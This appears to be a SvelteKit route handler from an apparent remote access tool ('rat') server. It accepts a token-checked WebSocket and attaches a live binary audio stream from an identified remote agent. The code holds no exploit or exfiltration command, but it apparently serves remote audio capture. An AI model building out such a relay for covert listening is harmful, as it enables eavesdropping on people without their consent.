import { error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { audioBridgeManager, AudioBridgeError } from '$lib/server/rat/audio';
import { AUDIO_STREAM_TOKEN_HEADER } from '../../../../../../../../shared/constants/protocol';

export const GET: RequestHandler = ({ request, params }) => {
	if (request.headers.get('upgrade')?.toLowerCase() !== 'websocket') {
		throw error(400, 'Expected WebSocket upgrade request');
	}

	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const url = new URL(request.url);
	if (url.protocol !== 'https:') {
		throw error(400, 'Secure transport required');
	}

	const sessionId = url.searchParams.get('sessionId');
	if (!sessionId) {
		throw error(400, 'Missing session identifier');
	}

	const token = request.headers.get(AUDIO_STREAM_TOKEN_HEADER);
	if (!token) {
		throw error(401, 'Missing audio stream token');
	}

	const pairFactory = (
		globalThis as {
			WebSocketPair?: new () => { 0: WebSocket; 1: WebSocket };
		}
	).WebSocketPair;

	if (!pairFactory) {
		throw error(503, 'WebSocket upgrade not supported');
	}

	const { 0: client, 1: serverSocket } = new pairFactory();

	try {
		audioBridgeManager.attachBinaryStream(id, sessionId, token, serverSocket);
	} catch (err) {
		try {
			serverSocket.close(1011, 'Audio stream rejected');
		} catch {
			// ignore close errors
		}
		if (err instanceof AudioBridgeError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to attach audio stream');
	}

	return new Response(null, { status: 101, webSocket: client } as unknown as ResponseInit);
};
